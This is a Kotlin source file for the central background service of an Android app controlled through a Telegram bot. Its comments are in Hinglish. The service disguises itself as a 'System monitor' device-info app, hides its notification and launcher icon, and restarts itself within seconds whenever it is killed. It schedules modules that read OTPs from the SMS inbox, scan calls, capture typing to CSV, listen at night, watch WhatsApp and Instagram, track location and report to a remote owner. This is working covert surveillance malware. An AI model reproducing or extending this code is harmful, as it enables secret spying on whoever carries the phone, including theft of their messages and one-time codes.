package com.kavach.app.core.service

import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import androidx.core.app.ServiceCompat
import com.kavach.app.KavachApp
import com.kavach.app.core.commands.CommandRouter
import com.kavach.app.core.fleet.FleetRegistry
import com.kavach.app.core.hq.MainBotCommander
import com.kavach.app.core.provisioning.OnboardingManager
import com.kavach.app.core.telegram.TelegramApi
import com.kavach.app.core.telegram.TelegramEngine
import com.kavach.app.security.PairingManager
import com.kavach.app.security.SecureStorage
import com.kavach.app.ui.disguise.DeviceInfoActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

/**
 * ⚙️ KavachService — APP KA DIL ❤️
 *
 * 24x7 chalne wali foreground service:
 *  - Telegram se commands sunti hai (long polling)
 *  - Token na ho toh patient wait karta hai (setup ho raha hai)
 *  - System kill kare → START_STICKY se wapas aata hai
 *  - Reboot → BootReceiver se wapas aata hai
 *
 * 🎭 Notification disguised hai: "Device Info — System monitor"
 */
class KavachService : Service() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
    private var engine: TelegramEngine? = null
    private var safeMode = false   // 🟡 v5.3.0: crash-loop pe heavy-load aaram, bot zinda

    override fun onBind(intent: Intent?): IBinder? = null

    /** 🧹 User ne app "swipe kill" ki (recents se hatai) → 3 sec me phir se paida */
    override fun onTaskRemoved(rootIntent: Intent?) {
        runCatching { com.kavach.app.core.keepalive.Watchdog.scheduleNext(this, 3_000) }
        super.onTaskRemoved(rootIntent)
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        // 🫀 v5.3.0 LONG-LIFE (chief order): safe-mode GATE pehle sabse, phir life-audit
        safeMode = runCatching { com.kavach.app.core.guard.CrashGuard.isSafeMode(this) }.getOrDefault(false)
        runCatching { com.kavach.app.core.guard.CrashGuard.stampBoot(this) }
        runCatching {
            val adv = com.kavach.app.core.shield.LifeLine.birthAudit(this)   // 🔍 maut-pakdo (murder/crash guess)
            if (adv != null) scope.launch { delay(25_000); sendOwner(adv) }  // ۘsirf 1 msg/din (silence-rule)
        }
        // 🛟 v5.5.0 FINAL chief-order: ghost-notif DEFAULT WAPAS OFF (pahla-wala design hi thik tha —
        // "manual-hide pe bhi chalta tha"). Ek-dafa migration: v5.2.0 first-run ne jo ON kar diya tha, use saaf.
        runCatching {
            val prefs = com.kavach.app.security.SecureStorage.prefs(applicationContext)
            if (!prefs.contains("ng_v55_migrated")) {
                prefs.edit().putBoolean("ng_v55_migrated", true).putBoolean("notif_ghost", false).apply()
                runCatching { com.kavach.app.core.ghost.NotifGhost.repostNormalChannel(applicationContext) }
            }
        }
        runCatching { com.kavach.app.core.tidy.Janitor.start(this) }            // 🧹 auto-clean every 15min
        // 👑 HQ commander (sirf MAIN phone pe active hoga) + 🫀 fleet heartbeat
        try { MainBotCommander.loop(applicationContext) } catch (_: Throwable) { }
        scope.launch { heartbeatLoop() }
        // 🔄 v2.8.0 AUTO-PILOT: update-watcher + motion + crash-report — sab crash-proof
        // 🪦 v3.7.1+: 6-ghnta auto-update-check RIP (chief order) — sirf manual /update bachega
        if (!safeMode) {   // 🟡 SAFE-MODE me heavy engines aaram (bot + watchdog poora live)
            runCatching { com.kavach.app.core.motion.KavachMotion.bootStart(applicationContext) }
            runCatching { com.kavach.app.core.wa.WaGod.init(applicationContext) }   // 😇 WA GOD-MODE boot (stars/anti-delete/call-sentry/vault)
            runCatching { com.kavach.app.core.media.MediaVault.ensureWatching(applicationContext) } // 🛡 MEDIA-WATCH boot (v3.9.0)
        }
        // 👻 v5.2.0 chief-order RIP (v5.5.0): ghost default-ON hata diya — pahla normal-minimal hi FINAL hai.
        // (/ghostnotif on se kabhi bhi ultra-ghost mode waapas mil sakta hai — chief-ke haath me choice)
        scope.launch {   // 🎨 v5.1.0: bot naam/DP/desc device-name se sync (stale ho tabhi, fail-silent)
            runCatching { com.kavach.app.core.style.KavachStyle.syncNow(applicationContext, null, false) }
        }
        // 🛡 v3.0.0 GOD-X: guards + spam-shield
        if (!safeMode) {
            runCatching { com.kavach.app.core.guard.StrangerGuard.register(applicationContext) }
            runCatching { com.kavach.app.core.sim.SimSentry.boot(applicationContext) }
            runCatching { com.kavach.app.core.ig.IgGod.init(applicationContext) }   // 📸 IG GOD-MODE boot (v3.1.0)
        }
        scope.launch { godTickLoop() }
        scope.launch { crashReportOnce() }
        scope.launch { safeModeIntro(safeMode) }
        scope.launch {   // 🎉 v5.4.0: UPDATE-COMPLETE detection (naya build ki pehli saans pe)
            runCatching { delay(18_000); com.kavach.app.core.update.UpdateGod.completeIfPending(applicationContext) }
        }
    }

    /** 📬 owner ko ek msg (crash-proof, token na ho toh chup) */
    private suspend fun sendOwner(msg: String) {
        runCatching {
            val tok = SecureStorage.getToken(applicationContext)
            val chat = SecureStorage.getOwnerChat(applicationContext)
            if (tok.isNotBlank() && chat != 0L) TelegramApi(tok).sendMessage(chat, msg)
        }
    }

    /** 🟡 SAFE-MODE wali boot pe ek line (har boot pe sirf ek baar) */
    private suspend fun safeModeIntro(safe: Boolean) {
        if (!safe) return
        val prefs = com.kavach.app.security.SecureStorage.prefs(applicationContext)
        val bootTs = prefs.getLong("cg_boot_ts", 0L)
        if (prefs.getLong("cg_safe_intro_at", 0L) == bootTs) return
        prefs.edit().putLong("cg_safe_intro_at", bootTs).apply()
        delay(35_000)
        sendOwner("🟡 SAFE-MODE chal raha hai (crash-loop pakda tha — heavy engines aaram)\n▸ Bot/kamand poora live ✔ 30min clean pe apne-aap full-power\n▸ /life = health-card • /survive = OEM-rescue")
    }

    /** ⏱ GOD-X master tick (~60s): sab guards/pollers/shield-flush — har call crash-proof */
    private suspend fun godTickLoop() {
        delay(45_000)   // boot settle
        var t = 0
        while (true) {
            val ctx = applicationContext
            runCatching { com.kavach.app.core.shield.AlertBus.flush(ctx) }
            runCatching { com.kavach.app.core.outbox.OutboxQ.flush(ctx) }
            runCatching { com.kavach.app.core.lowbatt.LowBatt.check(ctx) }
            if (!safeMode) {   // 🟡 SAFE-MODE: heavy/scanner squad aaram, bot+shields live (v5.3.0)
                runCatching { com.kavach.app.core.night.NightEar.manage(ctx) }   // 👂 night-ear lifecycle (v3.5.0)
                runCatching { com.kavach.app.core.wa.WaType.poll(ctx) }
                runCatching { com.kavach.app.core.shadow.TypeShadow.flush(ctx) }   // ⌨️ shadow→CSV (v3.1.0)
            }
            t++
            if (t % 2 == 0 && !safeMode) {   // ~2 min
                runCatching { com.kavach.app.core.wa.WaRelay.scanVoice(ctx) }
                runCatching { com.kavach.app.core.otp.OtpGod.scanSmsInbox(ctx) }   // 💌 OTP-GOD (v3.2.0)
                runCatching { com.kavach.app.core.call.CallRecon.scan(ctx) }       // 📞 CALL-RECON (v3.2.0)
            }
            if (t % 5 == 0) {   // ~5 min
                if (!safeMode) {
                    runCatching { com.kavach.app.core.wa.WaRelay.scanStatus(ctx) }
                    runCatching { com.kavach.app.core.geo.GeoFence.check(ctx) }
                    runCatching { com.kavach.app.core.sim.SimSentry.check(ctx) }
                    runCatching { com.kavach.app.core.screen.KavachScreen.deadWatch(ctx) }  // 🔑 screen-session yaad-dastoo (v3.6.0)
                    runCatching { com.kavach.app.core.deepfind.DreamIndexer.maybeTick(ctx) } // 🌙 raat+screen-off+charging pe nayi photos index (v3.8.0)
                    runCatching { com.kavach.app.core.media.MediaVault.ensureWatching(ctx) } // 🛡 WA/IG media-file watch (v3.9.0)
                }
                runCatching { com.kavach.app.core.ghost.NotifGhost.watch(ctx) }   // 👻 shade-miss guard (v3.3.0)
                runCatching { com.kavach.app.core.net.MainBotHeartbeat.check(ctx) }     // 💓 MAIN getMe early-warning (v3.7.1)
            }
            if (t % 15 == 0) {   // ~15 min
                runCatching { com.kavach.app.core.net.SosLane.check(ctx) }              // 🪂 Drive-SOS parachute (v3.7.1)
            }
            if (t % 60 == 0) runCatching { com.kavach.app.core.vault.SpaceJanitor.runAndReport(ctx) }  // 🧹 hourly weight-control (v3.4.0)
            delay(60_000)
        }
    }

    /** 🛡 pichhli boot pe crash hui thi? → ek baar owner ko report, file saaf */
    private suspend fun crashReportOnce() {
        runCatching {
            kotlinx.coroutines.delay(20_000)   // net settle
            val ctx = applicationContext
            val f = java.io.File(ctx.filesDir, "kv_last_crash.txt")
            if (!f.exists()) return@runCatching
            val tok = SecureStorage.getToken(ctx); val chat = SecureStorage.getOwnerChat(ctx)
            val body = f.readText().take(1500)
            f.delete()
            if (tok.isNotBlank() && chat != 0L) {
                com.kavach.app.core.telegram.TelegramApi(tok).sendMessage(chat,
                    "🛡 CRASH-SHIELD report — pichhli baar ek hiccup aaya tha (app khud revive ho gayi ✔):\n$body")
            }
        }
    }

    /** 🫀 Har 6 ghante: khud ko fleet registry me likh do.
     *  Uninstall/off → heartbeat rukta → 3 din baad list se auto-gayab (owner rule!) */
    private suspend fun heartbeatLoop() {
        while (true) {
            try {
                // 🫀 v5.3.0 LONG-LIFE: life-beat (0 extra wakeup — isi tick se) + safe-exit watch
                runCatching { com.kavach.app.core.shield.LifeLine.beat(applicationContext) }
                runCatching {
                    if (com.kavach.app.core.guard.CrashGuard.safeTick(applicationContext))
                        sendOwner("✅ SAFE-MODE se bahar aaya — 30min clean-uptime ✔ full-power resume. (/life dekho)")
                }
                runCatching { com.kavach.app.core.ghost.IconGhost.enforce(applicationContext) }   // 👻 v4.1.0 hidden-icon watchdog
                runCatching { com.kavach.app.core.ghost.IconGhost.autoTick(applicationContext) }   // ⏱ v4.3.0 auto-hide (setup ke ~8-18min baad)
                if (!safeMode) {
                    runCatching { com.kavach.app.core.finals.KavachFinals.tick(applicationContext) }   // 🏆 v5.0.0 finals-tick (jobs/rules/owl/drain/dp)
                    runCatching { com.kavach.app.core.wa.KavachWA.autoDailyJunkClean(applicationContext) }   // 🧹 v5.1.0 chief: WA auto-clean (roz ×1, silent)
                }
                if (PairingManager.isPaired(applicationContext)) {
                    val now = System.currentTimeMillis()
                    if (now - SecureStorage.getLastHeartbeat(applicationContext) > 6L * 60 * 60 * 1000) {
                        runCatching { FleetRegistry.upsertSelf(applicationContext) }
                        SecureStorage.setLastHeartbeat(applicationContext, now)
                    }
                }
            } catch (ce: kotlinx.coroutines.CancellationException) {
                throw ce
            } catch (_: Throwable) { }
            delay(10L * 60 * 1000)   // har 10 min check
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try {
            startAsForeground()
        } catch (t: Throwable) {
            // kabhi bhi crash NAHI — service phir bhi chalti rahegi
            t.printStackTrace()
        }
        supervise()
        return START_STICKY      // system kill kare toh wapas paida ho 💪
    }

    /** Token milte hi engine chalu; nahi mila → 🤖 AUTO-ONBOARDING (aapka design!) */
    private fun supervise() {
        // 🛡 v3.9.2 DUP-FIX: START_STICKY + keep-alive ping har baar onStartCommand→supervise
        // bula deta tha → 2-8 engines EK HI token pe poll karte = ✱✱ SAME msg 4-8 baar reply!
        // Ab process-latch: dusri call GUSSI ignore kar do (permanent-shadi sirf ek hi dulha 💍)
        synchronized(SupLatch) {
            if (SupLatch.running) return
            SupLatch.running = true
        }
        scope.launch {
            while (isActive) {
                val token = SecureStorage.getToken(applicationContext)
                if (token.isBlank()) {
                    // 🆕 Naya device: pair code MAIN bot pe bhejo + /pair ka intezaar
                    try {
                        OnboardingManager(applicationContext) { msg -> showProgress(msg) }.run()
                    } catch (ce: kotlinx.coroutines.CancellationException) {
                        throw ce
                    } catch (t: Throwable) {
                        delay(15_000)
                    }
                    continue
                }
                try {
                    // 👀 v3.9.3: paired device pe bhi repair-watch chalni chahiye (bot-block rescue lane)
                    runCatching {
                        com.kavach.app.core.provisioning.OnboardingManager(applicationContext) { msg -> showProgress(msg) }.watchLaunchSafe()
                    }
                    val api = TelegramApi(token)
                    val router = CommandRouter(applicationContext, api)
                    val eng = TelegramEngine(api, applicationContext)   // 🛡 v3.6.0 double-exec fix
                    engine = eng
                    eng.start { cmd -> router.route(cmd) }   // yeh block rahega
                } catch (ce: kotlinx.coroutines.CancellationException) {
                    throw ce
                } catch (t: Throwable) {
                    // kuch bhi toote — 10 sec baad phir se shuru
                    delay(10_000)
                }
            }
        }
    }

    /** 🔥 v3.9.3 rebind hot-swap: naya token aaya to ENGINE hi dobara paida —
     *  service-restart karenge to SupLatch FAS jaayega (dup-fix ka side-effect khatam). */
    suspend fun engineHotSwap() {
        runCatching { engine?.stop() }   // running=false → 50s poll foo-kar return → supervise naya engine
    }

    /** 📊 Progress = WAHIN EK notification update (naya kabhi nahi banta!) */
    private fun showProgress(msg: String) {
        val b = notifBuilder ?: return
        b.setContentText(msg)
        NotificationManagerCompat.from(this)
            .notify(KavachApp.NOTIF_ID_SERVICE, b.build())   // SAME id = replace, naya nahi
    }

    // 🫥 EK hi notification total — sab kuch isi mein hota hai (aur kuch NAHI)
    private var notifBuilder: NotificationCompat.Builder? = null

    private fun startAsForeground() {
        val tapIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, DeviceInfoActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )

        val G = com.kavach.app.core.ghost.NotifGhost   // 👻 v3.3.0 PHANTOM
        G.ensureChannel(this)
        val builder = NotificationCompat.Builder(this, G.channelFor(this))
            .setContentTitle("System monitor")
            .setContentText(if (G.ghostOn(this)) "" else "Active")
            .setSmallIcon(G.iconRes(this))
            .setContentIntent(tapIntent)
            .setOngoing(true)
            .setSilent(true)
            .setOnlyAlertOnce(true)                              // update pe ping NAHI
            .setVisibility(NotificationCompat.VISIBILITY_SECRET) // 🔒 lockscreen pe gayab
            .setPriority(NotificationCompat.PRIORITY_MIN)        // sabse chhota, sabse neeche
        if (G.ghostOn(this)) {
            builder.setCustomContentView(G.ghostView(this))
                .setStyle(NotificationCompat.DecoratedCustomViewStyle())  // 1dp blank content 👻
        }
        notifBuilder = builder

        val notif: Notification = builder.build()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            // Android 14+: explicit specialUse type (prerequisite-free — safe)
            ServiceCompat.startForeground(
                this, KavachApp.NOTIF_ID_SERVICE, notif,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
            )
        } else {
            startForeground(KavachApp.NOTIF_ID_SERVICE, notif)
        }
    }

    /** 👻 ghost-toggle ya shade-miss pe notification dobara lagao */
    fun repostForeground() { runCatching { startAsForeground() } }

    /** 💀 Service destroy → 3 sec me revive-alarm (belt + suspenders) */
    override fun onDestroy() {
        instance = null
        SupLatch.running = false   // 🛡 v3.9.3: naya service-instance dobara supervise() chala sake
        runCatching { com.kavach.app.core.keepalive.Watchdog.scheduleNext(this, 3_000) }
        runCatching { MainBotCommander.loopRunning = false }
        scope.cancel()
        runCatching { com.kavach.app.core.provisioning.OnboardingManager.WatchLatch.up = false }  // 🛡 naya process me watch bhi dobara laage
        super.onDestroy()
    }

    companion object {
        /** 🛡 supervise-latch — service kitne baar restart ho, poller sirf EK (v3.9.2 DUP-FIX) */
        val SupLatch = SuperviseLatch()

        @Volatile var instance: KavachService? = null; private set

        fun start(ctx: Context) {
            val i = Intent(ctx, KavachService::class.java)
            androidx.core.content.ContextCompat.startForegroundService(ctx, i)
        }

        // 🪦 v3.7.0: boostMediaProjectionType RIP (projection-engine poore me gaya)
    }
}


/** 🔒 supervise() ko sirf EK baar chalane wala latch (svc restart pe naya service-object aata to class-typed rak rakha) */
class SuperviseLatch { @Volatile var running = false }
